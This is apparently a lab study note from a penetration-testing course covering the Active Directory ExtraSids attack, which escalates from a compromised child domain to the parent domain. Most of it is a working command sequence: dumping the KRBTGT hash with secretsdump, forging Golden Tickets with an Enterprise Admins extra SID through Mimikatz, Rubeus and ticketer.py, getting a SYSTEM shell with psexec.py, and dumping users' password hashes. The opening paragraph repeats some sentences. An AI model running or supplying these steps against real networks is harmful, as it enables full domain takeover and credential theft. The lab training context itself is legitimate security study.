## ExtraSids Attack from Windows
- This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:
    The KRBTGT hash for the child domain
    The SID for the child domain
    The name of a target user in the child domain (does not need to exist!)
    The FQDN of the child domain.
    The SID of the Enterprise Admins group of the root domain.
    With this data collected, the attack can be performed with Mimikatz.

### 1. Get the SID for the child domain
- Powerview: `Get-DomainSID`

### 2. Obtaining Enterprise Admins Group's SID
- Powerview: `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`

### 3. Get KRBTGT hash
- The HTB guide suggests using Mimikatz to perform a DCSync attack; however, this technique may fail if the PowerShell session lacks sufficient privileges. Therefore, secretsdump can be used as an alternative
```
secretsdump.py -use-vss -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@10.129.72.235 -outputfile hash.txt
```

### 4. Creating a Golden Ticket with Mimikatz
```
PS C:\htb> mimikatz.exe
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### 5. Creating a Golden Ticket using Rubeus
- Instead of using Mimikatz, we can be utilized Rubeus to create Golden ticket
```
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## ExtraSids Attack from Linux
### 1. Get KRBTGT hash
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

### 2. Performing SID Brute Forcing
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
```

### 3. Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

### 4. Constructing a Golden Ticket using ticketer.py
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

### 5. Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=hacker.ccache
```

### 6. Getting a SYSTEM shell using Impacket's psexec.py
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
- Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain.
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

### 7. Dumping Hashes user bross
```
secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
```
